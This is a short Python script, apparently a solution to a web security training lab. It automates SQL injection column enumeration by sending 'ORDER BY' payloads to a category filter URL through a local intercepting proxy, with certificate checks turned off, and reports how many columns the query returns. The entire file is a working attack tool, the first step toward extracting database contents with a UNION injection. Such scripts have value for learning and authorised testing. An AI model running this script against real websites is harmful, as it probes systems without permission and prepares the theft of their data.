import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_no(url):
    path = '/filter?category=Gifts'
    for i in range(1, 50):  # Loop through column numbers
        sql_payload = "'+order+by+%s--" % i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1  # Return the last working column number
    return False  # If no error occurs, return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    print("[+] Figuring out the number of columns...")
    no_of_columns = exploit_sqli_column_no(url)
    if no_of_columns:
        print("[+] The number of columns is " + str(no_of_columns) + ".")
    else:
        print("[-] SQL injection failed.")
